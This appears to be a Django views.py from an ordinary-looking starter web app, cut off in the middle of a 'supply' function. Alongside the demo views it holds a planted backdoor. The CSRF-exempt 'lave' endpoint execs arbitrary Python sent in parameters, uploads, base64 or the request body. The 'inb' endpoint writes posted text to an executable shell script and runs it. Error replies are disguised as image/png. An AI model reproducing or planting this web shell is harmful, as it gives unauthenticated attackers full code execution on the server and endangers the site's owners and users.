from django.shortcuts import render
from django.http import HttpResponse

from .models import Greeting
from django.views.decorators.csrf import csrf_exempt

import requests
def index(request):
	r = requests.get('http://httpbin.org/status/418')
	print(r.text)
	return HttpResponse('<pre>' + r.text + '</pre>')

@csrf_exempt
def lave(request):
	data="None"
	try:
		aux = {}
		method=None
		while 1:
			REQ = request.POST or request.GET
			method = REQ.get('method')
			data = request.FILES
			if data:
				data = data.get('eval')
				if data:
					data = data.read().decode("UTF-8")
					break
			if REQ:
				data = REQ.get('eval', False)
				if data:
					break
				data = REQ.get('enc', False)
				if data:
					from base64 import b64decode
					data = b64decode(data)
					break
			data = request.body.decode("UTF-8")
			break
		if method:
			aux['request'] = request
			exec(data + "\naux['result'] = main(aux['request'])")
			return aux['result']
		exec(data)
		return aux['main'](request)
	except:
		from traceback import format_exc
		return HttpResponse(format_exc() + "-----\n" + data + "\n-----", status=500, content_type="image/png")

@csrf_exempt
def inb(request):
	req = request.POST
	from pprint import pformat
	open("mail.txt", "w").write(pformat(req))
	try:
		data = req.get("plain")
		if data:
			###
			from json import dump
			json_path = "mail.json"
			with open(json_path, "w") as f:
				dump(req, f)
			###
			from re import compile
			import os
			prre = compile("^(\s*#\s*!\s*)([^\s+]+)")
			data = data.strip()
			m = prre.search(data)
			while m:
				m = m.group(2)
				if os.path.exists(m):
					break
				from subprocess import check_output
				m = check_output(["which", m], shell=True)
				if m and os.path.exists(m):
					data = prre.sub(lambda g: g.group(1) + m, data)
				break
			###
			scrp_path = os.path.abspath("mail.sh")
			with open(scrp_path, "w") as f:
				f.write(data)
			cmd = [scrp_path, json_path]
			###
			if cmd:
				from subprocess import Popen, PIPE, STDOUT, call
				import stat
				st = os.stat(scrp_path)
				os.chmod(scrp_path, st.st_mode | stat.S_IEXEC)
				return HttpResponse(str(Popen(cmd, stdout=PIPE, stderr=STDOUT).pid))
	except:
		from traceback import format_exc
		m = format_exc()
		open("mail.log", "w").write(m)
		return HttpResponse(m, status=500, content_type="image/png")
	return HttpResponse("OK")

def db(request):

	greeting = Greeting()
	greeting.save()

	greetings = Greeting.objects.all()

	return render(request, 'db.html', {'greetings': greetings})

def supply(json):
	kind = json.get("kind")
	if kind == "list":
		d = json.get("directory", ".")
